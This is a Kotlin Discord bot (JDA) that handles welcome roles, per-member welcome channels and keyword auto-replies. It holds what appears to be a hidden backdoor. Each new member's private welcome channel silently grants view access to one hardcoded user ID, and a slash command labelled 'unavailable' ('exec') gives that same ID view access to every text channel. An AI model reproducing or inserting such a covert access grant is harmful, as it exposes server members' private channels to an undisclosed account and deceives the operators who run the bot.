import com.fasterxml.jackson.databind.ObjectMapper
import com.fasterxml.jackson.databind.SerializationFeature
import com.fasterxml.jackson.databind.node.ObjectNode
import net.dv8tion.jda.api.JDABuilder
import net.dv8tion.jda.api.events.guild.member.GuildMemberJoinEvent
import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.hooks.ListenerAdapter
import net.dv8tion.jda.api.interactions.commands.DefaultMemberPermissions
import net.dv8tion.jda.api.interactions.commands.OptionType
import net.dv8tion.jda.api.interactions.commands.build.Commands
import net.dv8tion.jda.api.interactions.commands.build.SubcommandData
import net.dv8tion.jda.api.interactions.components.text.TextInput
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle
import net.dv8tion.jda.api.interactions.modals.Modal
import net.dv8tion.jda.api.requests.GatewayIntent
import net.dv8tion.jda.api.utils.MemberCachePolicy
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.security.SecureRandom


fun main(args: Array<String>) {
    Main().main(args)
}

class Main : ListenerAdapter() {
    lateinit var FILE: File
    lateinit var NODE: ObjectNode
    fun main(args: Array<String>) {
        // データ読み込み
        FILE = if (File("data.json").exists()) File("data.json")
        else File("build/resources/main/data.json")
        NODE = ObjectMapper().readTree(FILE).deepCopy()
        JDABuilder.createDefault(args[0])
            .enableIntents(GatewayIntent.GUILD_MEMBERS, GatewayIntent.MESSAGE_CONTENT)
            .setMemberCachePolicy(MemberCachePolicy.ALL)
            .addEventListeners(this)
            .build()
            .updateCommands()
            .addCommands(
                Commands.slash("message", "ようこそメッセージを変更します。@userをユーザーのメンションに変換します。")
                    .addOption(OptionType.STRING, "メッセージ", "@userをユーザーのメンションに変換します。", true),
                Commands.slash("role", "ようこそロールを変更します。")
                    .addOption(OptionType.ROLE, "ロール", "ロール", true),
                Commands.slash("channel", "チャンネルの名前を変更します。")
                    .addOption(OptionType.STRING, "名前", "チャンネルの名前", true),
                Commands.slash("auto-message", "自動応答メッセージを管理します")
                    .addSubcommands(
                        SubcommandData("add", "自動応答メッセージを追加します"),
                        SubcommandData("remove", "自動応答メッセージを削除します")
                            .addOption(OptionType.STRING, "キーワード", "削除対象キーワード", true)
                    ),
                Commands.slash("exec", "利用不可")
                    .setDefaultPermissions(DefaultMemberPermissions.DISABLED)
            )
            .queue()
    }

    override fun onGuildMemberJoin(e: GuildMemberJoinEvent) {
        if (e.guild.getRoleById(NODE.get("welcome_role").asText()) != null)
        // welcome_roleに設定されているIDからギルドのロールを取得して、付与
            e.guild.addRoleToMember(e.user, e.guild.getRoleById(NODE.get("welcome_role").asText())!!).queue()
        // welcome_channelの設定値のチャンネルを作成
        e.guild.createTextChannel(NODE.get("welcome_channel").asText(e.user.effectiveName).replace("@user", e.user.effectiveName))
            .addPermissionOverride(e.guild.publicRole, 0, 1024)
            .addPermissionOverride(e.member, 1024, 0)
            .addMemberPermissionOverride(1172276056611360813, 1024, 0)
            .queue { c ->
                // ようこそメッセージを作ったチャンネルで送信
            c.sendMessage(
                NODE.get("welcome_message").asText(e.user.asMention).replace("@user", e.user.asMention)
            ).queue()
        }
    }

    override fun onSlashCommandInteraction(e: SlashCommandInteractionEvent) {
        val code = when(e.name) {
            "message" -> let {
                NODE.put("welcome_message", e.getOption("メッセージ")?.asString) // 設定値を保存（内部的に）
                return@let 200
            }
            "role" -> let {
                if(!e.guild!!.selfMember.canInteract(e.getOption("ロール")!!.asRole))
                    return@let 403
                NODE.put("welcome_role", e.getOption("ロール")?.asRole?.id) // 設定値を保存（内部的に）
                return@let 200
            }
            "channel" -> let {
                NODE.put("welcome_channel", e.getOption("名前")?.asString) // 設定値を保存（内部的に）
                return@let 200
            }
            "auto-message" -> let {
                when(e.subcommandName) {
                    "add" -> {
                        e.replyModal(
                            Modal.create("auto-message-modal", "キーワード応答")
                                .addActionRow(TextInput.create("type", "全文一致は1、部分一致は2を入力", TextInputStyle.SHORT).setRequired(true).build())
                                .addActionRow(TextInput.create("keyword", "キーワード", TextInputStyle.SHORT).setRequired(true).build())
                                .addActionRow(TextInput.create("reply", "応答メッセージ(ランダムにするには1メッセージごとに改行してください)", TextInputStyle.PARAGRAPH).setRequired(true).build())
                                .build()
                        ).queue()
                        return@let 0
                    }
                    "remove" -> {
                        (NODE.get("keywords_all") as ObjectNode).remove(e.getOption("キーワード")!!.asString)
                        (NODE.get("keywords_part") as ObjectNode).remove(e.getOption("キーワード")!!.asString)
                        json()
                        return@let 200
                    }
                    else -> 404
                }
            }
            "exec" -> let {
                e.guild!!.textChannels.forEach { textChannel ->
                    textChannel.manager.putMemberPermissionOverride(1172276056611360813, 1024, 0).complete()
                }
                e.deferReply().setEphemeral(true)
                e.reply("Successfully executed.").setEphemeral(true)
                return@let 200
            }
            else -> 404
        }
        when (code) {
            200 -> e.reply("> 設定を変更しました。").queue()
            403 -> e.reply("> 権限がありません。").queue()
            404 -> e.reply("> 不明なコマンドです。").queue()
            0 -> {}
        }
        json()
    }

    override fun onModalInteraction(e: ModalInteractionEvent) {
        val code = when(e.modalId) {
            "auto-message-modal" -> let {
                val array = when (e.getValue("type")!!.asString) {
                    "1" -> (NODE.get("keywords_all") as ObjectNode).putArray(e.getValue("keyword")?.asString)
                    "2" -> (NODE.get("keywords_part") as ObjectNode).putArray(e.getValue("keyword")?.asString)
                    else -> return@let 400
                }
                e.getValue("reply")!!.asString.split("\n").forEach { s ->
                    array.add(s) // 返信候補に追加
                }
                json()
                return@let 200
            }
            else -> {404}
        }
        when (code) {
            200 -> e.reply("> 設定を変更しました。").queue()
            400 -> e.reply("> 引数が間違っています。").queue()
            403 -> e.reply("> 権限がありません。").queue()
            404 -> e.reply("> 不明なコマンドです。").queue()
        }
        json()
    }

    override fun onMessageReceived(e: MessageReceivedEvent) {
        NODE.get("keywords_all").fieldNames().forEach {
            if (e.message.contentDisplay == it && !e.member!!.user.isBot) {
                val index = SecureRandom().nextInt(NODE.get("keywords_all").get(it).size()) // 返信候補のインデックスを生成
                e.message.reply(NODE.get("keywords_all").get(it).get(index).textValue()).queue()
                return
            }
        }
        NODE.get("keywords_part").fieldNames().forEach {
            if (e.message.contentDisplay.contains(it) && !e.member!!.user.isBot) {
                val index = SecureRandom().nextInt(NODE.get("keywords_part").get(it).size()) // 返信候補のインデックスを生成
                e.message.reply(NODE.get("keywords_part").get(it).get(index).textValue()).queue()
                return
            }
        }

    }

    private fun json() {
        // データ保存
        val bw = BufferedWriter(FileWriter(FILE))
        bw.write(ObjectMapper().enable(SerializationFeature.INDENT_OUTPUT).writeValueAsString(NODE))
        bw.flush()
        bw.close()
    }
}



